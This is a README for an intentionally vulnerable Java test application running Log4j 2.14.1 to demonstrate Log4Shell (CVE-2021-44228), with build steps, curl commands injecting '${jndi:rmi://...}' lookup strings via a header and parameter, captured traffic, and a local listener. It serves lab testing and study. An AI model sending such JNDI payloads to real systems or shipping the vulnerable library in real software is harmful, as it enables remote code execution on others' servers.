# Log4Shell Vulnerable Application(l4s-vulnapp)

This is a potentially vulnerable Java web application containing Log4j(2.14.1) affected by [log4shell](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)(CVE-2021-44228).

## Verified environment and various versions

- [AdoptOpenJDK 17.0.10+7](https://adoptium.net/temurin/releases/?os=windows&arch=x64&package=jdk&version=17)
- [Gradle 8.6](https://gradle.org/next-steps/?version=8.6&format=all)
- [Gretty 4.1.2](https://plugins.gradle.org/plugin/org.gretty)
- [Apache Tomcat 10.1.15](https://tomcat.apache.org/tomcat-10.1-doc/changelog.html#Tomcat_10.1.15_(schultz))
- [Apache Log4j Core 2.14.1](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.1)

## Preparation

- Download and extract [AdoptOpenJDK](https://adoptium.net/temurin/releases/) zip file.
- set a PATH and JAVA_HOME variable.
- Execute `java --version` command to check if AdoptOpenJDK works properly.

[Note]  
If you want to change the JDK version, tomcat port, etc., edit build.gradle.

## Build and Run

Execute Gradle wrapper with build.gradle.

```
# on Linux
./gradlew appRun

# on Windows
.\gradlew.bat appRun
```

Top URL:

```
http://localhost:8080/l4s-vulnapp/
```

[Note]  
Log4Shell triggers only when the app performs some Log4j logging.   
For example, if the following URL is accessed, Log4Shell will be executed.

```
http://localhost:8080/l4s-vulnapp/servlet
```

You can check Log4Shell by tampering with "x-param" value or by adding "x-log" header to the HTTP request when accessing it.  
These params will be logged by Log4j.  
However, this is only if a listening server is standing at localhost:8081.

```
curl http://localhost:8080/l4s-vulnapp/servlet -H 'x-log: ${jndi:rmi://localhost:8081/test.txt}'
curl -X GET http://localhost:8080/l4s-vulnapp/servlet?x-param=%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A8081%2Ftest.txt%7D
```

## Verification Results

- HTTP Request
  
  ```
  GET http://localhost:8080/l4s-vulnapp/servlet?x-param=%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A8081%2Ftest.txt%7D HTTP/1.1
  Host: localhost:8080
  Connection: keep-alive
  Cache-Control: max-age=0
  sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
  sec-ch-ua-mobile: ?0
  sec-ch-ua-platform: "Windows"
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)   Chrome/122.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/  *;q=0.8,application/signed-exchange;v=b3;q=0.7
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: navigate
  Sec-Fetch-User: ?1
  Sec-Fetch-Dest: document
  Referer: http://localhost:8080/l4s-vulnapp/
  Accept-Encoding: gzip, deflate, br, zstd
  Accept-Language: ja,en-US;q=0.9,en;q=0.8
  
  
  ```

- HTTP Response

  ```
  HTTP/1.1 200
  Content-Type: text/plain;charset=utf-8
  Content-Length: 62
  Date: Fri, 15 Mar 2024 18:42:56 GMT
  Keep-Alive: timeout=60
  Connection: keep-alive

  Hello
  Logging to console using vulnerable Log4j2 by parameter
  ```

- RMI Request by l4s-vulnapp

  ```
  2024/03/16 03:42:46: [Start] Receive Server for Log4Shell.
  2024/03/16 03:42:46: [Note] Listening on IP: "localhost" Port: 8081
  2024/03/16 03:42:55: [Note] Requested from IP: "127.0.0.1" Port: 53282)
  2024/03/16 03:42:55: [Hex data] ===== start =====
  2024/03/16 03:42:56: 00000000   4A 52 4D 49 00 02 4B 00 00 00 00 00 00 00 00 00  JRMI..K.........
  2024/03/16 03:42:56: 00000010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  2024/03/16 03:42:56: [Hex data] =====  end  =====
  2024/03/16 03:42:56: [Raw data] ===== start =====
  2024/03/16 03:42:56: JRMI
  2024/03/16 03:42:56: [Raw data] =====  end  =====
  ```

## Option

l4s-ls.ps1  starts a listen server, execute this script on Windows PowerShell/Command Prompt.  
This server receives binary communications such as LDAP and RMI, and can display the contents of said communications in Hex and Raw.  
If the script malfunctions, use Ctrl + C to stop.

[Caution]  
When running this script for the first time, it is necessary to select "Private Network" in the Windows pop-up.

```
PowerShell -ExecutionPolicy RemoteSigned .\l4s-ls.ps1 -p 8081
```

## References

- [GitHub - tothi/log4shell-vulnerable-app](https://github.com/tothi/log4shell-vulnerable-app)
- [ももいろテクノロジー - PowerShellでnc（netcat）を書いてみる (2015/4/16)](https://inaz2.hatenablog.com/entry/2015/04/16/025953)

